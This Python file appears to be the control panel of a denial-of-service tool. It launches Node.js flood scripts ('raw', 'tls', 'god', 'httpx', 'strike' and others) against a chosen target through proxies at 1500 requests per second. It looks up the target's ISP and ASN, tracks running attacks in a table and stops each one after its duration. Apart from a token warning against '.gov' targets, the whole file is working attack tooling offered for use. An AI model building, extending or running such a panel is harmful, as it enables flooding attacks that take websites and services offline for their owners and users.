import subprocess
import time
from lib import parseurl
import requests
import socket
from rich.table import Table
from rich.console import Console
from lib import Colors

DEBUG = True

class Ingfo:
    @staticmethod
    def IngfoAttack(target, duration, method):
        try:
            d = parseurl(target)
            ip = socket.gethostbyname(d)
            rs = requests.get(f"http://ip-api.com/json/{ip}?fields=33292287")
            if target.startswith("http://"):
                port = 80
            elif target.startswith("https://"):
                port = 443
            else:
                port = "N/A"
            
            if port == 443:
                secure = "Yes"
            elif port == 80:
                secure = "No"
            else:
                secure = "Unknown"
            
            if rs.status_code == 200:
                data = rs.json()
                isp = data.get("isp", "N/A")
                org = data.get("org", "N/A")
                ast = data.get("as", "N/A")
                asname = data.get("asname", "N/A")
                dns = data.get("reverse", "N/A")
            else:
                isp = org = ast = asname = dns = "N/A"
        except (requests.exceptions.RequestException, socket.gaierror) as e:
            print(f"Error fetching information for target {target}: {e}")
            return None
        
        adjiingfo = f"""{Colors.sky_blue}
STATUS
─────────────────────────────────────
Target     : {target}
Port       : {port}
Secure     : {secure}
Duration   : {duration}
Method     : {method}
ISP        : {isp}
ORG        : {org}
AS         : {ast}
AS NAME    : {asname}
DNS        : {dns}
{Colors.reset}"""
        return print(adjiingfo)

class DoSPanel:
    AProcess = []

    @staticmethod
    def RunAttack(target: str, duration: str, method: str):
        proxy = "proxy.txt"
        rps = "1500"
        thread = "5"

        cmd = {
            "raw": ["node", "bin/raw.js", target, duration, "raw", thread],
            "proxy": ["node", "bin/raw.js", target, duration, "proxy", thread],
            "storm": ["node", "bin/raw.js", target, duration, "storm", thread],
            "glory": ["node", "bin/glory.js", target, duration, rps, thread, proxy],
            "tls": ["node", "bin/StarsXManuk.js", target, duration, rps, thread, proxy],
            "god": ["node", "bin/StarsXGod.js", target, duration, rps, thread, proxy],
            "httpx": ["node", "bin/HTTP-X.js", target, duration, rps, thread, proxy],
            "strike": ["node", "bin/strike.js", "GET", target, duration, thread, rps, proxy],
        }

        if target.endswith(".gov"):
            print("[WARNING] Don't attack .gov domain")
            return None

        if method not in cmd:
            print(f"Error: Unknown method '{method}'")
            return None

        try:
            process = subprocess.Popen(
                cmd[method],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            DoSPanel.AProcess.append({
                "process": process,
                "target": target,
                "method": method,
                "duration": int(duration), 
                "start_time": time.time(),
            })
            Ingfo.IngfoAttack(target=target, duration=duration, method=method)

            if DEBUG:
                stdout, stderr = process.communicate(timeout=5)
                #print("\n[DEBUG] Process Output:")
                print(stdout)
                #print("\n[DEBUG] Process Errors:")
                print(stderr)

            return process
        except subprocess.TimeoutExpired:
            #print("[DEBUG] Process is running in the background.")
            return process
        except Exception as e:
            print(f"Failed to start attack: {e}")
            return None

    @staticmethod
    def MonitorAttacks():
        while True:
            current_time = time.time()
            for attack in DoSPanel.AProcess[:]: 
                elapsed_time = current_time - attack["start_time"]
                if elapsed_time >= attack["duration"]:
                    #print(f"Terminating attack on {attack['target']} (method: {attack['method']}) after {attack['duration']} seconds.")
                    DoSPanel.TerminateAttack(attack["process"])
            time.sleep(1) 

    @staticmethod
    def TerminateAttack(process):
        try:
            process.terminate()
            DoSPanel.AProcess = [
                p for p in DoSPanel.AProcess if p["process"] != process
            ]
            print("Attack terminated successfully.")
        except Exception as e:
            print(f"Error terminating attack: {e}")

    @staticmethod
    def ListRunningAttack():
        if not DoSPanel.AProcess:
            print("No ongoing attacks are currently running.")
            return []

        console = Console()
        table = Table(title="Ongoing Attacks")

        table.add_column("ID", justify="center", style="bold cyan")
        table.add_column("Target", style="bold green")
        table.add_column("Method", style="yellow")
        table.add_column("Duration (s)", justify="center")
        table.add_column("Elapsed (s)", justify="center")

        current_time = time.time()
        for idx, attack in enumerate(DoSPanel.AProcess, start=1):
            elapsed_time = int(current_time - attack["start_time"])
            table.add_row(
                str(idx),
                attack["target"],
                attack["method"],
                str(attack["duration"]),
                str(elapsed_time)
            )

        console.print(table)
        return DoSPanel.AProcess
